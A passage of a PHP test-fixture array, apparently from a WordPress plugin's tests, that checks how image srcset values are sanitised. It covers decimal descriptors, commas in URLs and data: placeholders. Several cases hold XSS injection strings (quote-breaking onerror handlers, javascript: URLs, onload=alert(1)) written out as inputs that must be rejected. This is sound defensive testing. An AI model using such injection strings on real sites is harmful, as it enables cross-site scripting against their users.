				'sizes'  => '',
			]
		),
		$jpg_filetype
	),

	/**
	 * Test Case: picture source with decimal density descriptors (issue #8931)
	 * The source must be kept with every candidate and descriptor unchanged.
	 */
	'testPictureSourceDecimalDensity' => $srcset_descriptor_case(
		[
			'type'    => 'picture',
			'src'     => 'http://example.org/wp-content/uploads/venice.jpg',
			'sources' => [
				[
					'srcset' => $decimal_srcset,
					'media'  => '',
					'type'   => 'image/webp',
					'sizes'  => '',
				],
			],
		],
		json_encode(
			(object) [
				'type'    => 'picture',
				'src'     => 'http://example.org/wp-content/uploads/venice.jpg',
				'sources' => [
					[
						'srcset' => $decimal_srcset,
						'media'  => '',
						'type'   => 'image/webp',
						'sizes'  => '',
					],
				],
			]
		),
		$webp_filetype
	),

	/**
	 * Test Case: decimal width descriptor is invalid HTML and must still be rejected.
	 */
	'testImgSrcsetDecimalWidthRejected' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480.5w',
			'sizes'  => '',
		],
		'{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
		$jpg_filetype
	),

	/**
	 * Test Case: negative density descriptor must still be rejected.
	 */
	'testImgSrcsetNegativeDensityRejected' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => 'http://example.org/wp-content/uploads/image.jpg -1x',
			'sizes'  => '',
		],
		'{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
		$jpg_filetype
	),

	/**
	 * Test Case: malformed decimal density (trailing dot, multiple dots) must be rejected.
	 */
	'testImgSrcsetMalformedDecimalDensityRejected' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => 'http://example.org/wp-content/uploads/image-a.jpg 1.x, http://example.org/wp-content/uploads/image-b.jpg 1.5.2x',
			'sizes'  => '',
		],
		'{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
		$jpg_filetype
	),

	/**
	 * Test Case: decimal density combined with an injection attempt must be rejected.
	 */
	'testImgSrcsetDecimalDensityWithInjectionRejected' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => 'http://example.org/wp-content/uploads/image.jpg 1.5x" onerror="alert(1)',
			'sizes'  => '',
		],
		'{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
		$jpg_filetype
	),

	/**
	 * Test Case: picture source with a decimal width descriptor is dropped, the <img> fallback is kept.
	 */
	'testPictureSourceDecimalWidthRejected' => $srcset_descriptor_case(
		[
			'type'    => 'picture',
			'src'     => 'http://example.org/wp-content/uploads/venice.jpg',
			'sources' => [
				[
					'srcset' => 'http://example.org/wp-content/uploads/venice-480.webp 480.5w',
					'media'  => '',
					'type'   => 'image/webp',
					'sizes'  => '',
				],
			],
		],
		'{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/venice.jpg","sources":[]}',
		$webp_filetype
	),
	/**
	 * Test Case: commas inside the URL path (Cloudinary-style transformations).
	 * Candidates are split per the HTML srcset parsing rules, not on every comma.
	 */
	'testImgSrcsetCommaInUrlPath' => $img_srcset_case(
		'https://res.cloudinary.com/demo/image/upload/w_400,c_fill/image.jpg 400w, https://res.cloudinary.com/demo/image/upload/w_800,c_fill/image.jpg 800w',
		'https://res.cloudinary.com/demo/image/upload/w_400,c_fill/image.jpg 400w, https://res.cloudinary.com/demo/image/upload/w_800,c_fill/image.jpg 800w'
	),

	/**
	 * Test Case: commas inside the query string (imgix-style parameters).
	 */
	'testImgSrcsetCommaInQueryString' => $img_srcset_case(
		'https://demo.imgix.net/image.jpg?w=400&fit=crop,faces 400w, https://demo.imgix.net/image.jpg?w=800&fit=crop,faces 800w',
		'https://demo.imgix.net/image.jpg?w=400&fit=crop,faces 400w, https://demo.imgix.net/image.jpg?w=800&fit=crop,faces 800w'
	),

	/**
	 * Test Case: candidates separated by a comma without whitespace are still split.
	 */
	'testImgSrcsetCommaWithoutWhitespace' => $img_srcset_case(
		'http://example.org/wp-content/uploads/image-1x.jpg 1x,http://example.org/wp-content/uploads/image-2x.jpg 2x',
		'http://example.org/wp-content/uploads/image-1x.jpg 1x, http://example.org/wp-content/uploads/image-2x.jpg 2x'
	),

	/**
	 * Test Case: relative URLs without a leading slash are valid srcset candidates.
	 */
	'testImgSrcsetRelativeUrlWithoutLeadingSlash' => $img_srcset_case(
		'wp-content/uploads/image-1x.jpg 1x, ./image-2x.jpg 2x, ../uploads/image-3x.jpg 3x',
		'wp-content/uploads/image-1x.jpg 1x, ./image-2x.jpg 2x, ../uploads/image-3x.jpg 3x'
	),

	/**
	 * Test Case: query parameters containing "on" followed by "=" (e.g. options=crop) are not event handlers.
	 */
	'testImgSrcsetQueryParamLookingLikeEventHandler' => $img_srcset_case(
		'http://example.org/wp-content/uploads/image.jpg?options=crop 1x, http://example.org/wp-content/uploads/image-2x.jpg?version=2 2x',
		'http://example.org/wp-content/uploads/image.jpg?options=crop 1x, http://example.org/wp-content/uploads/image-2x.jpg?version=2 2x'
	),

	/**
	 * Test Case: a whitespace-separated event handler must still be rejected.
	 */
	'testImgSrcsetUnquotedEventHandlerRejected' => $img_srcset_case(
		'http://example.org/wp-content/uploads/image.jpg onerror=alert(1)',
		null
	),

	/**
	 * Test Case: a leading event handler must still be rejected.
	 */
	'testImgSrcsetLeadingEventHandlerRejected' => $img_srcset_case(
		'onerror=alert(1)',
		null
	),

	/**
	 * Test Case: non-http schemes must still be rejected, even though relative URLs are now allowed.
	 */
	'testImgSrcsetJavascriptSchemeRejected' => $img_srcset_case(
		'javascript:alert(1) 1x',
		null
	),

	/**
	 * Test Case: data URIs must still be rejected.
	 */
	'testImgSrcsetDataSchemeRejected' => $img_srcset_case(
		'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4= 1x',
		null
	),
	/**
	 * Test Case: a data: placeholder candidate is skipped, the real candidates are kept (issue #8949).
	 */
	'testImgSrcsetDataPlaceholderCandidateSkipped' => $img_srcset_case(
		'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 1w, http://example.org/wp-content/uploads/image-1200.jpg 1200w, http://example.org/wp-content/uploads/image-768.jpg 768w',
		'http://example.org/wp-content/uploads/image-1200.jpg 1200w, http://example.org/wp-content/uploads/image-768.jpg 768w'
	),

	/**
	 * Test Case: a candidate URL with an apostrophe is skipped, the other candidates are kept (issue #8949).
	 */
	'testImgSrcsetApostropheCandidateSkipped' => $img_srcset_case(
		"http://example.org/wp-content/uploads/image-1200.jpg 1200w, http://example.org/wp-content/uploads/o'neil-768.jpg 768w",
		'http://example.org/wp-content/uploads/image-1200.jpg 1200w'
	),

	/**
	 * Test Case: a hostile candidate is skipped without storing any of it, the valid candidate is kept.
	 */
	'testImgSrcsetHostileCandidateSkipped' => $img_srcset_case(
		'http://example.org/wp-content/uploads/image.jpg" onerror="alert(1) 1x, http://example.org/wp-content/uploads/image-2x.jpg 2x, javascript:alert(1) 3x, onload=alert(1) 4x',
		'http://example.org/wp-content/uploads/image-2x.jpg 2x'
	),

	/**
	 * Test Case: when no srcset candidate survives, the LCP falls back to a src-only img (issue #8949).
	 */
	'testImgSrcsetFallsBackToSrcWhenNoCandidateSurvives' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/image.jpg',
			'srcset' => 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 1w, http://example.org/wp-content/uploads/image.jpg 480.5w',
			'sizes'  => '(max-width: 600px) 480px, 800px',
		],
		'{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
		$jpg_filetype
	),

	/**
	 * Test Case: a picture source keeps its valid candidates when one is a data: placeholder (issue #8949).
	 */
	'testPictureSourceDataPlaceholderCandidateSkipped' => $srcset_descriptor_case(
		[
			'type'    => 'picture',
			'src'     => 'http://example.org/wp-content/uploads/venice.jpg',
			'sources' => [
				[
					'srcset' => 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 1x, http://example.org/wp-content/uploads/venice-1x.webp 1x, http://example.org/wp-content/uploads/venice-2x.webp 2x',
					'media'  => '',
					'type'   => 'image/webp',
					'sizes'  => '',
				],
			],
		],
		json_encode(
			(object) [
				'type'    => 'picture',
				'src'     => 'http://example.org/wp-content/uploads/venice.jpg',
				'sources' => [
					[
						'srcset' => 'http://example.org/wp-content/uploads/venice-1x.webp 1x, http://example.org/wp-content/uploads/venice-2x.webp 2x',
						'media'  => '',
						'type'   => 'image/webp',
						'sizes'  => '',
					],
				],
			]
		),
		$webp_filetype
	),
];
